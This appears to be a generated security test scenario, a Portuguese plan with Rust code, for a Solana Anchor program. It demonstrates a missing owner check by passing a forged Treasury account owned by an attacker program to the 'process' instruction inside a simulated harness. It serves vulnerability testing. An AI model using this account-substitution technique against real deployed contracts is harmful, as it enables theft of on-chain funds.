{
  "plan": "O cenário inicializa uma conta Treasury legítima via `initialize` (baseline), com authority = carteira legítima. Em seguida, o ataque chama `process` passando uma conta Treasury forjada, cujo dono é um programa atacante (não o programa-alvo), mas com os mesmos dados (authority = signer, is_active = true). O efeito medido é que a conta forjada foi aceita e usada: o ataque tem sucesso e a conta forjada permanece com dono diferente do programa-alvo, demonstrando a falha de verificação de dono.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

// Baseline: inicializa uma treasury legítima
let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);
let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let baseline_result = env.baseline("initialize treasury", &init_ix, &init_accounts);

// Ataque: chama process com uma conta Treasury forjada, dona de outro programa
let attacker_program = env.attacker_program.unwrap_or(Pubkey::new_unique());
let forged_treasury_data = anchor_account_data(
    "Treasury",
    &(authority, 100u64, true),
);
let forged_treasury = account(&attacker_program, &forged_treasury_data, None);

let process_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let process_accounts = vec![
    (treasury_key, forged_treasury),
    (authority, wallet(1_000_000_000)),
];

let attack_result = env.attack("process with forged treasury owner", &process_ix, &process_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_treasury = after(&attack_result, &treasury_key);
    env.effect(
        "forged treasury with wrong owner was accepted and used",
        after_treasury.owner() == &attacker_program,
    );
}"
}

